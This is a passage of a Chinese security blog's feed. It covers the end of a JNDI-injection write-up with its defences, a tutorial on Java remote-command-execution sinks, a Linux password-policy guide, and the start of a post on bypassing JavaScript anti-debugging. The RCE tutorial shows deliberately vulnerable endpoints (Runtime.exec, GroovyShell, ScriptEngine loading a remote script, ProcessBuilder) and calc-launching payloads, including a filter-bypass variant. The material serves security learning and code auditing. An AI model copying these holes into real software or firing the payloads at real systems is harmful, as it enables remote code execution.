绕过高版本JDK（8u191+）限制</h1><p>本部分参考自KINGX大佬的博客：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><p>由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p><p>KINGX提到了如下两种绕过方式：</p><blockquote><ul><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li></ul><p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p></blockquote><p>简单地说，就是利用受害者本地ClassPath环境是否存在可被利用的Gadget来进行攻击。</p><p>具体的参考后面的一篇文章：<a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">浅析高低版JDK下的JNDI注入及绕过</a></p><h1 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h1><ul><li>使用最新的JDK版本；</li><li>将外部数据传入InitialContext.lookup()方法前先进行严格的过滤；</li><li>使用安全管理器时，需要仔细审计安全策略；</li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://blog.csdn.net/u011721501/article/details/52316225">BlackHat2016——JDNI注入&#x2F;LDAP Entry污染攻击技术研究</a><br><a href="https://www.freebuf.com/vuls/115849.html">JNDI注入及Spring RCE漏洞分析</a><br><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016 回顾之 JNDI 注入简单解析</a><br><a href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/">Java代码审计学习之JNDI注入</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><h1 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h1><p>最近爆出的Log4j漏洞，也是JNDI注入的漏洞，可以参考下面的分析文章。<br><a href="https://secariolabs.com/research/analysing-and-reproducing-poc-for-log4j-2-15-0">Log4j2的PoC</a><br><a href="https://blog.csdn.net/weixin_44684812/article/details/121982519">Log4j2的PoC简单介绍</a><br><a href="https://paper.seebug.org/1787/">Apache Log4j2 Jndi RCE 高危漏洞分析与防御</a></p><p>参考链接</p><p><a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x02-web攻防</category>
      
      <category>0x09-Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>网络安全</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java远程代码执行学习(1)</title>
    <link href="/2023/07/21/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/"/>
    <url>/2023/07/21/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<p>前言：最近在学习Java安全方面的内容，记录一下Java中的几个命令执行函数，使用Javasec靶场进行演示</p><h2 id="第一个命令执行函数-RuntimeExec"><a href="#第一个命令执行函数-RuntimeExec" class="headerlink" title="第一个命令执行函数  RuntimeExec"></a>第一个命令执行函数  RuntimeExec</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>远程命令执行漏洞，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p><p>可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><p>getRuntime()常用于执行本地命令，使用频率较高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/runtime&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">RuntimeExec</span><span class="hljs-params">(String cmd, Model model)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        String line;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">proc</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br><br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> proc.getInputStream();<br>            <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(fis, <span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(isr);<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(line).append(System.lineSeparator());<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            sb.append(e);<br>        &#125;<br>        model.addAttribute(<span class="hljs-string">&quot;results&quot;</span>, sb.toString());<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;basevul/rce/runtime&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是一个基于Spring框架的Java程序，其中包含了一个处理HTTP请求的方法。该方法接受一个名为cmd的参数，并将其作为命令传递给操作系统运行。然后，程序获取命令的输出，并将输出内容保存到一个StringBuilder对象中，最后将输出结果作为模型属性返回给视图。</p><p>这段代码实现了一个”Runtime Exec”功能，可以执行操作系统命令。</p><p><img src="/./../../images/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/image-20230721100201126.png" alt="image-20230721100201126"></p><h2 id="第二个命令执行函数-ScriptEngineManager"><a href="#第二个命令执行函数-ScriptEngineManager" class="headerlink" title="第二个命令执行函数 ScriptEngineManager"></a>第二个命令执行函数 ScriptEngineManager</h2><p>该漏洞又叫脚本引擎代码注入</p><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在Java 8之后ScriptEngineManager的eval函数就没有了</p><p>windows: </p><p>var a &#x3D; mainOutput(); function mainOutput() { var x&#x3D;java.lang.Runtime.getRuntime().exec(“calc”)};</p><p>Payload绕过: </p><p>var a &#x3D; mainOutput(); function mainOutput() { var    x&#x3D;java.lang.//Runtime.getRuntime().exec(“calc”);}</p><p>恶意代码(java)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">// 通过加载远程js文件来执行代码，如果加载了恶意js则会造成任意命令执行</span><br><span class="hljs-comment">// 远程恶意js: var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="hljs-comment">// ⚠️ 在Java 8之后移除了ScriptEngineManager的eval</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jsEngine</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>);<br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(&#x27;%s&#x27;)&quot;</span>, url);<br>    engine.eval(payload, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><p>js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-title function_">mainOutput</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mainOutput</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> x = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>引用这一个js文件，就可以触发该漏洞</p><p><img src="/./../../images/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/image-20230721101714944.png" alt="image-20230721101714944"></p><h2 id="第三个-Groovy执行命令"><a href="#第三个-Groovy执行命令" class="headerlink" title="第三个  Groovy执行命令"></a>第三个  Groovy执行命令</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 不安全的使用Groovy调用命令</span><br><br><span class="hljs-keyword">import</span> groovy.lang.GroovyShell;<br><span class="hljs-meta">@GetMapping(&quot;/groovy&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">groovy</span><span class="hljs-params">(String cmd)</span> &#123;<br>    <span class="hljs-type">GroovyShell</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>();<br>    shell.evaluate(cmd);<br>&#125;<br></code></pre></td></tr></table></figure><p>* windows: “calc”.execute()</p><p>* macos: “open -a Calculator”.execute()</p><p><img src="/./../../images/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/image-20230721102406073.png" alt="image-20230721102406073"></p><p>就是一个传参，后端有该代码的时候直接传恶意代码就好</p><h2 id="第四个-ProcessBuilder"><a href="#第四个-ProcessBuilder" class="headerlink" title="第四个 ProcessBuilder"></a>第四个 ProcessBuilder</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Process类是一个抽象类（所有的方法均是抽象的），封装了一个进程（即一个执行程序）。</p><p>Process 类提供了执行从进程输入、执行输出到进程、等待进程完成、检查进程的退出状态以及销毁（杀掉）进程的方法。</p><p>ProcessBuilder.start() 和 Runtime.exec 方法创建一个本机进程，并返回 Process 子类的一个实例，该实例可用来控制进程并获取相关信息。</p><p>创建的子进程没有自己的终端或控制台。它的所有标准 io（即 stdin，stdout，stderr）操作都将通过三个流 (getOutputStream()，getInputStream()，getErrorStream()) 重定向到父进程，通过流的形式进行读取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">ProcessBuilderExec</span><span class="hljs-params">(String ip, String safe, Model model)</span> &#123;<br>        <span class="hljs-keyword">if</span> (safe != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (Security.checkOs(ip)) &#123;<br>                model.addAttribute(<span class="hljs-string">&quot;results&quot;</span>, <span class="hljs-string">&quot;检测到非法命令注入&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;basevul/rce/processbuilder&quot;</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//        String[] cmdList = &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ping -c 1 &quot; + ip&#125;;</span><br>        String[] cmdList = &#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;ping -n 1 &quot;</span> + ip&#125;;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        String line;<br>        String results;<br><br>        <span class="hljs-comment">// 利用指定的操作系统程序和参数构造一个进程生成器</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        pb.redirectErrorStream(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 使用此进程生成器的属性启动一个新进程</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            process = pb.start();<br>            <span class="hljs-comment">// 取得命令结果的输出流</span><br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> process.getInputStream();<br>            <span class="hljs-comment">// 用一个读输出流类去读</span><br>            <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(fis, <span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-comment">// 用缓存器读行</span><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(isr);<br>            <span class="hljs-comment">//直到读完为止</span><br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(line).append(System.lineSeparator());<br>            &#125;<br>            results = sb.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            results = e.toString();<br>        &#125;<br>        model.addAttribute(<span class="hljs-string">&quot;results&quot;</span>, results);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;basevul/rce/processbuilder&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/./../../images/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/image-20230721102848515.png" alt="image-20230721102848515"></p><h2 id="第五个-ProcessImpl"><a href="#第五个-ProcessImpl" class="headerlink" title="第五个 ProcessImpl"></a>第五个 ProcessImpl</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>对于ProcessImpl类不能直接调用，但可以通过反射来间接调用ProcessImpl来达到执行命令的目的</p><p>该类非Public修饰，所以在不同包下只能通过反射的方式去调用执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">processImplExec</span><span class="hljs-params">(String cmd, Model model)</span> &#123;<br>        <span class="hljs-type">CharArrayWriter</span> <span class="hljs-variable">infoStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>            method.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd&#125;, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);<br><br>            <span class="hljs-type">char</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">2048</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            infoStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharArrayWriter</span>();<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> e.getInputStream();<br>            <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, <span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-keyword">while</span> ((readSize = inputStreamReader.read(bs)) &gt; <span class="hljs-number">0</span>) &#123;<br>                infoStream.write(bs, <span class="hljs-number">0</span>, readSize);<br>            &#125;<br>            model.addAttribute(<span class="hljs-string">&quot;results&quot;</span>, infoStream.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            ex.printStackTrace();<br>            model.addAttribute(<span class="hljs-string">&quot;results&quot;</span>, ex.toString());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;basevul/rce/processimpl&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/./../../images/Java%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0-1/image-20230721102947929-1689906589658-1.png" alt="image-20230721102947929"></p><p>在白盒测试中，要挖rce漏洞，可以尝试全局搜索这五个函数并进行代码审计</p><p>黑盒测试的时候就只能靠运气了</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x02-web攻防</category>
      
      <category>0x09-Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>网络安全</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux密码复杂度设置</title>
    <link href="/2023/07/14/Linux%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%E8%AE%BE%E7%BD%AE/"/>
    <url>/2023/07/14/Linux%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="Linux-密码复杂度设置pam-pwquality、pam-passwdqc"><a href="#Linux-密码复杂度设置pam-pwquality、pam-passwdqc" class="headerlink" title="Linux 密码复杂度设置pam_pwquality、pam_passwdqc"></a>Linux 密码复杂度设置pam_pwquality、pam_passwdqc</h2><p>1、Linux对应的密码策略模块有：pam_passwdqc 和 pam_pwquality 。其中pam_passwdqc模块对应的是&#x2F;etc&#x2F;login.defs，pam_pwquality对应的是&#x2F;etc&#x2F;security&#x2F;pwquality.conf<br>2、模块的添加方法：&#x2F;etc&#x2F;pam.d&#x2F;passwd<br>password required pam_pwquality.so retry&#x3D;3<br>3、模块的配置方法有两种：<br>一、password required pam_pwquality.so dcredit&#x3D;-1 ucredit&#x3D;-1 ocredit&#x3D;-1 lcredit&#x3D;0<br>二、添加到&#x2F;etc&#x2F;security&#x2F;pwquality.conf 中<br>4、&#x2F;etc&#x2F;security&#x2F;pwquality.conf详解：<br>retry&#x3D;N：定义登录&#x2F;修改密码失败时，可以重试的次数；<br>Difok&#x3D;N：定义新密码中必须有几个字符要与旧密码不同。但是如果新密码中有1&#x2F;2以上的字符与旧密码不同时，该新密码将被接受；<br>minlen&#x3D;N：定义用户密码的最小长度；<br>dcredit&#x3D;N：定义用户密码中必须包含多少个数字；<br>ucredit&#x3D;N：定义用户密码中必须包含多少个大写字母；<br>lcredit&#x3D;N：定义用户密码中必须包含多少个小些字母；<br>ocredit&#x3D;N：定义用户密码中必须包含多少个特殊字符（除数字、字母之外）；<br>其中 &#x3D;-1表示，至少有一个<br>5、&#x2F;etc&#x2F;login.defs详解：<br>PASS_MAX_DAYS 99999 #密码的最大有效期, 99999:永久有期<br>PASS_MIN_DAYS 0 #是否可修改密码,0可修改,非0多少天后可修改<br>PASS_MIN_LEN 5 #密码最小长度,使用pam_cracklib module,该参数不再有效<br>PASS_WARN_AGE 7 #密码失效前多少天在用户登录时通知用户修改密码<br>6、实际生产环境配置<br>&#x2F;etc&#x2F;security&#x2F;pwquality.conf ：<br>minlen &#x3D; 8<br>minclass &#x3D; 1<br>maxrepeat &#x3D; 0<br>maxclassrepeat &#x3D; 4<br>lcredit &#x3D; -1<br>ucredit &#x3D; -1<br>dcredit &#x3D; -1<br>ocredit &#x3D; -1<br>difok&#x3D;5<br>&#x2F;etc&#x2F;login.defs：<br>PASS_MAX_DAYS 90<br>PASS_MIN_LEN 12<br>PASS_MIN_DAYS 7<br>PASS_WARN_AGE 30<br>UMASK 077</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x07-杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>安全运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js反调试</title>
    <link href="/2023/07/13/js%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <url>/2023/07/13/js%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们在挖src的时候有时会需要调试一下js，但是有时又会遇到js反调试技术，这里就总结一下绕过反调试的几种常见方法</p><h2 id="什么是js反调试"><a href="#什么是js反调试" class="headerlink" title="什么是js反调试"></a>什么是js反调试</h2><p>JS反调试（Anti-Debugging）是指在JavaScript代码中使用各种技术和方法来阻止或干扰对代码的调试和分析。它是一种用于保护代码免受逆向工程或黑客攻击的技术手段。<br>JS反调试的目标是阻止或干扰常见的调试技术和工具，例如使用浏览器的开发者工具或调试器来检查和修改代码、设置断点、查看变量值等操作。通过实施反调试技术，开发人员可以增加攻击者分析和调试代码的难度，从而提高代码的安全性。</p><p>总而言之，所谓js反调试就是一种实现防止他人调试、动态分析自己的代码的技术</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/1689243091308-84b09e86-31f1-4625-83c7-088726236028.png" alt="image.png"></p><h2 id="常见的js检测调试的方法"><a href="#常见的js检测调试的方法" class="headerlink" title="常见的js检测调试的方法"></a>常见的js检测调试的方法</h2><p>1.检测console对象：使用console.log输出调试信息是常见的调试方式，因此可以尝试检测console对象是否存在。</p><p>2.检测调试器是否开启：通过捕获异常来判断是否有调试器开启，因为调试器运行时往往会阻止异常抛出。</p><p>3.检测调试器的钩子（Hook）：一些调试器会在运行时给调试页面注入特定的全局变量或方法，通过检测这些变量或方法是否存在来判断调试器是否开启</p><p>4.检测源代码修改：检测document对象或其内部元素是否被修改，来判断是否有人试图修改源代码。</p><p>5.检测浏览器的高度插值</p><p>6.检测开发者人员工具变量是否为true</p><p>7.利用代码运行的时间差</p><p>8.利用toString</p><p>9.检测非浏览器</p><h2 id="常见绕过方法"><a href="#常见绕过方法" class="headerlink" title="常见绕过方法"></a>常见绕过方法</h2><p>下面就来谈一谈常见的绕过js反调试的方法</p><p>-禁用断点法</p><p>-条件断点法</p><p>-此处暂停法</p><p>-置空函数法</p><p>-本地覆盖法</p><h3 id="禁用断点法"><a href="#禁用断点法" class="headerlink" title="禁用断点法"></a>禁用断点法</h3><p>举个例子</p><p><a href="https://jx.qqqjx.com/?url=https://www.luffycity.com/play/5812">https://jx.qqqjx.com/?url=https://www.luffycity.com/play/5812</a></p><p>这是一个在线视频解析网站，当打开F12的时候就会发现无法动弹，自动在这里卡住了，不让我们进行调试</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230713233054108.png" alt="image-20230713233054108"></p><p>当你取消F12的时候就可以继续正常访问了，那我们该怎么进行在F12的情况下正常运行呢？</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230713233606356.png" alt="image-20230713233606356"></p><p>这时我们发现网站可以正常运行了</p><p>但是这时候我们会发现，这时我们自己的断点也不起作用了，这就很尴尬</p><h3 id="条件断点法"><a href="#条件断点法" class="headerlink" title="条件断点法"></a>条件断点法</h3><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714003933735.png" alt="image-20230714003933735"></p><p>首先在debugger这一行打一个断点，然后右击，编辑断点</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714004025331.png" alt="image-20230714004025331"></p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714004050450.png" alt="image-20230714004050450"></p><p>按照上图进行操作，这时再刷新网站，回答先还有一处debugger，用同样的的操作添加条件断点，这是刷新网站发现可以正常运行了</p><h3 id="此处暂停法"><a href="#此处暂停法" class="headerlink" title="此处暂停法"></a>此处暂停法</h3><p>直接在断点处右击，选择永不在此处暂停再刷新也可以进行绕过</p><p><img src="/./../../images/js%E5%8F%8D%E8%B0%83%E8%AF%95/image-20230714004540141.png" alt="image-20230714004540141"></p><h3 id="置空函数法"><a href="#置空函数法" class="headerlink" title="置空函数法"></a>置空函数法</h3><p>找到这个debug方法名，在控制台重写替换，将其置空（需要找到debug的函数，然后将它置空，但是这里我没找到）</p><p>置空函数法是一种常见的绕过 JavaScript 反调试的方法之一。它的基本原理是将调试器检测代码中的关键函数或变量进行修改，使其在调试环境下失效，以此来防止或绕过反调试机制。</p><p>下面是一个示例代码，演示了置空函数法绕过反调试的实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 检测调试器的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">detectDebugger</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 检测到调试器打开</span><br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Debugger detected!&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 